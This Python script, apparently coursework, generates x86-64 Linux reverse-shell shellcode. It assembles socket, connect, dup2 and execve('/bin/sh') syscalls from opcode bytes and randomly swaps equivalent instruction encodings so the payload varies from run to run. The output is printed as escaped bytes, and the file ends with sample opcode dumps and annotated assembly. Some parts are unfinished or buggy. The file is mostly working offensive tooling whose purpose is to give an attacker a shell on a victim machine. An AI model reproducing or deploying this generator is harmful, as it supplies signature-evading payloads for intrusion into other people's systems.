from pickletools import opcodes
import random
import socket


# using objdump on my asm reverse shell executable i can have the opcodes :
# # objdump -d ./executable|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'



#---------------------------------------------------------------------------------------------------------------------
#----------------------------------------CONVERSION FUNCTIONS---------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def decimal_to_hex(decimal_value):
    hex_value = hex(decimal_value)[2:]  # Convert to hexadecimal and remove '0x' prefix
    return '0x' + hex_value

def ip_to_decimal_list(ip_list):
    decimal_value = (int(ip_list[0]) * pow(256, 3)) + (int(ip_list[1]) * pow(256, 2)) + (int(ip_list[2]) * 256) + int(ip_list[3])
    return decimal_value


def decimal_to_hex_port(port_number_decimal):
    # Convert decimal port number to network byte order (little-endian) in hexadecimal format
    port_number_hex = socket.htons(port_number_decimal)
    return port_number_hex


def ip_to_hex_with_format(ip_address):
    # Split the IP address into its four octets
    octets = ip_address.split('.')

    # Reverse the order of the octets
    reversed_octets = octets[::-1]

    updated_list = []
    if '0' in reversed_octets :
        # print("there's a zero")
        for element in reversed_octets:
            updated_list.append(str(int(element) + 1))

        #### IL RESTE DEUX AUTRE CAS à TRAITER##############################
        # CAS OU L IP CONTIENT UN 255 ET UN 0
        # if '0' in reversed_octets and '255' in reversed_octets  :
        #     print("there's a zero and a 255")
        # CAS OU L IL CONTIENT UN 255
        # elif '255' in reversed_octets :
        #     print("there's a 255")
        ##########################################################################

        # Convert each octet to its hexadecimal representation
        hex_octets = [format(int(octet), '02X') for octet in updated_list]
        ones_to_add = ['01', '01', '01', '01']
        # Concatenate the hexadecimal octets and add the '0x' prefix
        hex_value = '0x' + ''.join(hex_octets)
        ones_in_hex = '0x' + ''.join(ones_to_add)
    
        int_value1 = int(hex_value, 16)
        int_value2 = int(ones_in_hex, 16)

        # Perform subtraction
        result = int_value1 - int_value2
        # Convert the result back to hex format
        hex_result = hex(result)
        return hex_value, ones_in_hex
    else :
        hex_octets = [format(int(octet), '02X') for octet in reversed_octets]
        hex_value = '0x' + ''.join(hex_octets)
        return hex_value





#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def int_to_hex_and_bits(integer_value):
    # Convert the integer to hexadecimal representation
    hex_value = hex(integer_value)[2:].upper()

    # Make sure the hex number has an even number of digits by adding leading zeros if needed
    if len(hex_value) % 2 != 0:
        hex_value = "0" + hex_value

    # Insert spaces between each two digits
    hex_value_with_spaces = ' '.join(hex_value[i:i+2] for i in range(0, len(hex_value), 2))

    # Reverse the order of the bytes to represent in little-endian format
    little_endian_hex = ' '.join(hex_value_with_spaces.split()[::-1])

    # Calculate the length of the integer in bits
    bit_length = integer_value.bit_length()

    return little_endian_hex, bit_length



#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------






# A function that takes the register clears it
def xor_rax_rax():
    list_ = ["48 31 c0", "4d 31 c0 4c 89 c0"] 
    return random.choice(list_)


def xor_rbx_rbx():
    list_ = ["48 31 db", "4d 31 c0 4c 89 c3"]
    return random.choice(list_)

def xor_rcx_rcx():
    list_ = ["48 31 c9", "4d 31 c0 4c 89 c1"]
    return random.choice(list_)    

def xor_rbi_rbi():
    list_ = ["48 31 FF"] # ,"48 31 C0 48 89 C7"
    return random.choice(list_)


def xor_rdi_rdi():
    list_ = ["48 31 FF", "4d 31 c0 4c 89 c7"] # ,"48 31 C0 48 89 C7"
    return random.choice(list_)


def xor_rsi_rsi():
    list_ = ["48 31 F6", "4d 31 c0 4c 89 c6"] #,"48 31 D2 48 89 D6"
    return random.choice(list_)


def xor_rdx_rdx():
    list_ = ["48 31 D2", "4d 31 c0 4c 89 c2"] # ,"48 31 FF 48 89 FA"
    return random.choice(list_)

#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



########################################## A COMPLETER ###############################################################
########################################## A COMPLETER ###############################################################

#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------R10----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


# mov rdi, r10 = 49 89 c2 
def mov_rdi_r10():
    list_ = ["4c 89 d7"]
    return random.choice(list_)

# mov r10, rax = 48 89 f8 
def mov_r10_rax():
    list_ = ["49 89 c2"]
    return random.choice(list_)
########################################## A COMPLETER ###############################################################
########################################## A COMPLETER ###############################################################


#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RAX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------

# mov rax, rdi = 48 89 f8 
def mov_rax_rdi():
    list_ = ["48 89 f8"]
    return random.choice(list_)
# mov rax, rsi = 48 89 f0 
def mov_rax_rsi():
    list_ = ["48 89 f0"]
    return random.choice(list_)
# mov rax, rdx = 48 89 d0
def mov_rax_rdx():
    list_ = ["48 89 d0"]
    return random.choice(list_)
# mov rax, rax = 48 89 c0
def mov_rax_rax():
    list_ = ["48 89 c0"]
    return random.choice(list_)


def mov_rax_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RAX, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c0 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c0"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EAX, ( an integer > 16 and =< 32 bits ) |||||| b8 XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "b8"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov AX, (an integer > 8 and =< 16 bits ) |||||| 66 b8 XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 b8"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov AL, (an integer =< 8 bits ) ||||||= b0 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "b0"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)



#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RBX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------

# mov rbx, rdi = 48 89 fb
def mov_rbx_rdi():
    list_ = ["48 89 fb"]
    return random.choice(list_)

# mov rbx, rsi = 48 89 f3 
def mov_rbx_rsi():
    list_ = ["48 89 f3"]
    return random.choice(list_)

# mov rbx, rdx = 48 89 d3
def mov_rbx_rdx():
    list_ = ["48 89 d3"]
    return random.choice(list_)

# mov rbx, rbx = 48 89 c0
def mov_rbx_rax():
    list_ = ["48 89 c3"]
    return random.choice(list_)





    

def mov_rbx_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov rbx, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C3 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 BB"
        print("####" + str(little_endian_hex))
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EBX, ( an integer > 16 and =< 32 bits ) |||||| BB xx xx xx xx
    elif (bits > 16 and bits <= 32):
        opcode = "BB"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov BX, (an integer > 8 and =< 16 bits ) |||||| 66 BB xx xx
    elif (bits > 8 and bits <= 16):
        opcode = "66 BB"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov BL, (an integer =< 8 bits ) |||||| B3 xx
    elif (bits >= 0 and bits <= 8):
        opcode = "B3"
        list_ = [opcode + " " + little_endian_hex]

    return random.choice(list_)



########################################## A COMPLETER ###############################################################
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RCX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
########################################## A COMPLETER ###############################################################




#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


# mov rdi, rbx = 48 89 df
def mov_rdi_rbx():
    list_ = ["48 89 df"]
    return random.choice(list_)
# mov rdi, rdi = 48 89 f8 
def mov_rdi_rdi():
    list_ = ["48 89 ff"]
    return random.choice(list_)
# mov rdi, rsi = 48 89 f0 
def mov_rdi_rsi():
    list_ = ["48 89 f7"]
    return random.choice(list_)
# mov rdi, rdx = 48 89 d0
def mov_rdi_rdx():
    list_ = ["48 89 d7"]
    return random.choice(list_)
# mov rdi, rax = 48 89 c0
def mov_rdi_rax():
    list_ = ["48 89 c7"]
    return random.choice(list_)

def mov_rdi_rsp():
    list_ = ["48 89 e7"]
    return random.choice(list_)



def mov_rdi_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RDI, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c7 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c7"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EDI, ( an integer > 16 and =< 32 bits ) |||||| bf XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "bf"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov DI, (an integer > 8 and =< 16 bits ) |||||| 66 bf XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 bf"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov DIL, (an integer =< 8 bits )  |||||| 40 b7 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "40 b7"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)




#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RSI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------

# mov rsi, rsp = 48 89 e6 
def mov_rsi_rsp():
    list_ = ["48 89 e6"]
    return random.choice(list_)

# mov rsi, rbx = 48 89 de 
def mov_rsi_rbx():
    list_ = ["48 89 de"]
    return random.choice(list_)
# mov rsi, rdi = 48 89 fe 
def mov_rsi_rdi():
    list_ = ["48 89 fe"]
    return random.choice(list_)
# mov rsi, rsi = 48 89 f6
def mov_rsi_rsi():
    list_ = ["48 89 f6"]
    return random.choice(list_)
# mov rsi, rdx = 48 89 d6
def mov_rsi_rdx():
    list_ = ["48 89 d6"]
    return random.choice(list_)
# mov rsi, rax = 48 89 c6
def mov_rsi_rax():
    list_ = ["48 89 c6"]



def mov_rsi_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RSI, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C6 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c6"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov ESI, ( an integer > 16 and =< 32 bits ) |||||| BE XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "be"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov SI, (an integer > 8 and =< 16 bits ) |||||| 66 BE XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 be"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov SIL, (an integer =< 8 bits ) |||||| 40 b6 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "40 b6"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)


def sub_rsi_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    # 7 bits 83 ee
    if (bits > 16 and bits <= 32):
        opcode = "81 ee"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)


def ip_to_decimal(a,b,c,d):
    return (a * pow(255,3)) + (b * pow(255,2)) + (c * 255) + d 

def ip_in_esi(ip_address):
    ip_in_hex = ip_to_hex_with_format(ip_address)
    # Split the IP address into its four octets
    octets = ip_address.split('.')
    # Reverse the order of the octets
    reversed_octets = octets[::-1]



    if '0' in reversed_octets : 
        return mov_rsi_valeur(int(ip_in_hex[0], 16)) + " " + sub_rsi_valeur(int(ip_in_hex[1], 16))


# mov esi, 0x02 ff ff 80      
# sub esi, 0x01 ff ff 01
# print(ip_to_hex_with_format("128.1.1.2"))
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



# mov rdx, rdi = 48 89 fa
def mov_rdx_rdi():
    list_ = ["48 89 fa"]
    return random.choice(list_)
# mov rdx, rsi = 48 89 f2
def mov_rdx_rsi():
    list_ = ["48 89 f2"]
    return random.choice(list_)
# mov rdx, rdx = 48 89 d2
def mov_rdx_rdx():
    list_ = ["48 89 d2"]
    return random.choice(list_)
# mov rdx, rax = 48 89 c2
def mov_rdx_rax():
    list_ = ["48 89 c2"]
    return random.choice(list_)


def mov_rdx_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RDX, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C2 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c2"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EDX, ( an integer > 16 and =< 32 bits ) |||||| BA XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "ba"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov DX, (an integer > 8 and =< 16 bits ) |||||| 66 BA XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 ba"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov DL, (an integer =< 8 bits ) |||||| B2 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "b2"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)



#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------PUSH----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------




# A function that takes the register clears it
def push_rax():
    list_ = ["50"]
    return random.choice(list_)

def push_rbx():
    list_ = ["53"]
    return random.choice(list_)

def push_rcx():
    list_ = ["51"]
    return random.choice(list_)

def push_rdx():
    list_ = ["52"]
    return random.choice(list_)

def push_rdi():
    list_ = ["57"]
    return random.choice(list_)


def push_word_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    # push word value ( an integer = 16 bits ) |||||| 66 6a
    if (bits == 16):
        opcode = "66 6a"
        list_ = [opcode + " " + little_endian_hex]
    #  push word value (an integer >  and =< 15 bits ) |||||| 66 68
    elif (bits > 7 and bits <= 15):
        opcode = "66 68"
        list_ = [opcode + " " + little_endian_hex]
    #  push word value (an integer =< 7 bits ) |||||| 66 6a
    elif (bits >= 0 and bits <= 7):
        opcode = "66 6a"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)


########################################## A COMPLETER pour toutes les tailles ###############################################################

#Push word between 1000 and 9999
def push_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    opcode = "66 68"
    list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)






########################################## A COMPLETER ###############################################################
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------INC----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def inc_rsi():
    list_ = ["48 ff c6"]
    return random.choice(list_) 


########################################## A COMPLETER ###############################################################
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------SUB----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------




########################################## A COMPLETER ###############################################################
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------INC----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def inc_rsi():
    list_ = ["48 ff c6"]
    return random.choice(list_) 


########################################## A COMPLETER ###############################################################
#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------SYSCALL------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
def syscall():
    list_ = ["0f 05"]
    return random.choice(list_) 






#### exemple du prof pour sys_exit

# mov al,06 : b0 3c
# mov al, 99, sub al, 39
# mov al, 30 # add al, 30
# mov 





def clear_all_reg():
    opcodes = ""
    opcodes += xor_rax_rax()
    opcodes += " " + xor_rbx_rbx()
    opcodes += " " + xor_rcx_rcx()
    opcodes += " " + xor_rdi_rdi()
    opcodes += " " + xor_rsi_rsi()
    opcodes += " " + xor_rdx_rdx()
    return opcodes




def sys_socket():
    opcodes = ""
    opcodes += mov_rax_valeur(41)
    opcodes += " " + mov_rbx_valeur(2)
    opcodes += " " + mov_rdi_rbx()
    opcodes += " " + mov_rbx_valeur(1)
    opcodes += " " + mov_rsi_rbx()
    opcodes += " " + syscall()
    return opcodes


def sys_connect(ip,port):
    opcodes = ""
    opcodes +=  mov_rdi_rax()
    opcodes += " " + mov_r10_rax()
    opcodes += " " + xor_rax_rax()
    opcodes += " " + mov_rax_valeur(42)
    opcodes += " " + xor_rbx_rbx()
    opcodes += " " + push_rbx()
    opcodes += " " + ip_in_esi(ip)
    opcodes += " " + push_word_valeur(port)
    opcodes += " " + push_word_valeur(2)
    opcodes += " " + mov_rsi_rsp()
    opcodes += " " + mov_rdx_valeur(24)
    opcodes += " " + syscall()
    return opcodes


def dup2():
    opcodes = ""
    opcodes +=  xor_rax_rax()
    opcodes += " " + xor_rdx_rdx()
    opcodes += " " + mov_rax_valeur(33)                  # syscall dup2
    opcodes += " " + mov_rdi_r10()                # socket.fd
    opcodes += " " + xor_rsi_rsi()                # stdin
    opcodes += " " + syscall()  

    opcodes += " " + xor_rax_rax()
    opcodes += " " + xor_rdx_rdx()
    opcodes += " " + mov_rax_valeur(33)                  # syscall dup2
    opcodes += " " + mov_rdi_r10()                # socket.fd
    opcodes += " " + inc_rsi()                     # stout
    opcodes += " " + syscall()                    

    opcodes += " " + xor_rax_rax()
    opcodes += " " + xor_rdx_rdx()
    opcodes += " " + mov_rax_valeur(33)                  # syscall dup2
    opcodes += " " + mov_rdi_r10()                # socket.fd
    opcodes += " " + inc_rsi()                     # stderr
    opcodes += " " + syscall()                     
    
    return opcodes



def execv():
    opcodes = ""
    opcodes +=  xor_rax_rax()
    opcodes += " " + xor_rdx_rdx()
    opcodes += " " + mov_rbx_valeur(7526411553527181103)
    opcodes += " " + push_rax()                    # IMPORTANT 
    opcodes += " " + push_rbx()                    # on met rbx sur la stack
    opcodes += " " + mov_rdi_rsp()                # on stock l'adresse de rbx (qui viens d'etre push) dans rdi (arg1)
    opcodes += " " + push_rax()
    opcodes += " " + push_rdi()
    opcodes += " " + mov_rsi_rsp()                # stock de la stack dans rsi (arg2)
    opcodes += " " + mov_rax_valeur(59)                # num syscall de execve
    opcodes += " " + syscall()
    return opcodes

def exit():
    opcodes = ""
    opcodes +=  xor_rdi_rdi()
    opcodes += " " + xor_rax_rax()
    opcodes += " " + mov_rax_valeur(60)                # syscall de exit 0x3c
    opcodes += " " + syscall()
    return opcodes




x = clear_all_reg() + sys_socket() + sys_connect("127.0.0.1",8989) + dup2() + execv() + exit()



def hex_with_spaces_to_backslash_x(hex_with_spaces):
    # Split the input string by spaces and remove any empty strings
    hex_values = [value for value in hex_with_spaces.split(' ') if value]

    # Convert each hex value to the corresponding "\x" format
    converted_values = [rf"\x{value.zfill(2)}" for value in hex_values]

    # Join the converted values to form the final result
    return ''.join(converted_values)

print(hex_with_spaces_to_backslash_x(x))


# 48 31 c0 48 31 db 48 31 c9 48 31 FF 48 31 F6 48 31 D2 b0 29 B3 02 48 89 df B3 01 48 89 de 0f 05 48 89 c7 49 89 c2 48 31 c0 b0 2A 48 31 db 53 be 80 -- 01 01 02 81 ee 01 01 01 01 66 68 1D 23 -- 66 6a 02 48 89 e6 b2 18 0f 05 48 31 c0 48 31 D2 b0 21 4c 89 d7 48 31 F6 0f 05 48 31 c0 48 31 D2 b0 21 4c 89 d7 48 ff c6 0f 05 48 31 c0 48 31 D2 b0 21 4c 89 d7 48 ff c6 0f 05 48 31 c0 48 31 D2 48 BB 2F 2F 62 69 6E 2F 73 68 50 53 48 89 e7 50 57 48 89 e6 b0 3B 0f 05 48 31 FF 48 31 c0 b0 3C 0f 05
# 48 31 c0 48 31 db 48 31 c9 48 31 ff 48 31 f6 48 31 d2 b0 29 b3 02 48 89 df b3 01 48 89 de 0f 05 48 89 c7 49 89 c2 48 31 c0 b0 2a 48 31 db 53 be 80 -- ff ff 20 81 ee 01 ff ff 10 66 68 23 1d -- 66 6a 02 48 89 e6 b2 18 0f 05 48 31 c0 48 31 d2 b0 21 4c 89 d7 48 31 f6 0f 05 48 31 c0 48 31 d2 b0 21 4c 89 d7 48 ff c6 0f 05 48 31 c0 48 31 d2 b0 21 4c 89 d7 48 ff c6 0f 05 48 31 c0 48 31 d2 48 bb 2f 2f 62 69 6E 2f 73 68 50 53 48 89 e7 50 57 48 89 e6 b0 3b 0f 05 48 31 ff 48 31 c0 b0 3c 0f 05

# mov al, 0x29                # 0x29 = 41 base 10, sys_socket   
# mov bl, 0x02                # 2 à destination finale de RDI, pour AF_INTET (ipv4)
# mov rdi, rbx
# mov bl, 0x01               # 1 à destination finale de RSI, pour SOCK_STREAM (TCP)
# mov rsi, rbx
# syscall
